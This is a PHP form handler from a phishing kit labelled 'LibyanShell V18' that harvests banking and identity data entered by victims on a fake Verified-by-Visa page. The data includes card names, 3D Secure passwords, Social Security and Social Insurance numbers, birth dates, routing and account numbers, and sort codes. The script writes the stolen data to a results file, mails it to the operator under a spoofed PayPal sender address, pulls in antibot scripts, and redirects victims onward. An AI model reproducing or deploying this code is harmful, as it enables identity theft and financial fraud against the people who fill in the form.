<?php

session_start();
if(isset($_POST['noc'])){
	if(!empty($_POST['_3d'])){
$HF_V = $_SESSION['country_name'];

$name_cart = $_POST['noc'];

$_3d = $_POST['_3d'];

$ssn = $_POST['ssn'];

$date = $_POST['date'];

$rgn = $_POST['rgn']; // USA

$sin = $_POST['sin']; // CA

$an = $_POST['an']; // USA && UK && AU && IR

$sc = $_POST['sc']; // UK && IR

$ka = $_POST['ka']; // GE && SW

$on = $_POST['on'];  // AU

$cl = $_POST['cl']; // AU

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "^_^ ";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " VBV ♥ ♥ -  [ " .$ip. " - " .$wiz. " ] ";
$headers .= "From: ^__Rzlt__^ <paypal@support.com> " . "\r\n";

$message = "


################### LibyanShell V18 ############################

Name Cart         =>   ".$name_cart."
Password or SecureCode(3d) :         =>   ".$_3d."
SSN:       =>   ".$ssn."
Birth Date:        =>   ".$date. "
Routing Number:    =>   ".$rgn. "
Social Insurance Number:    =>   ".$sin. "
Social Security Number:    =>   ".$ssn. "
Account Number:         =>     ".$an. "
Sort Code:              =>     ".$sc. "
Kartenkontonummer:      =>     ".$ka. "
OSID Number:            =>     ".$on. "
Credit Limit:           =>     ".$cl. "
IP              =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME            =>   <font color='#3366FF'>".$time."

################### LibyanShell V18 ############################

";

$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
include './email.php';
include '../antibots.php';
include '../block.php';
mail($yourmail, $subject, $message , $headers);

 header("location:../bank.php?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");

 }else{
	header("Location: ../bank.php");
}}else{
	header("Location: ../bank.php");
}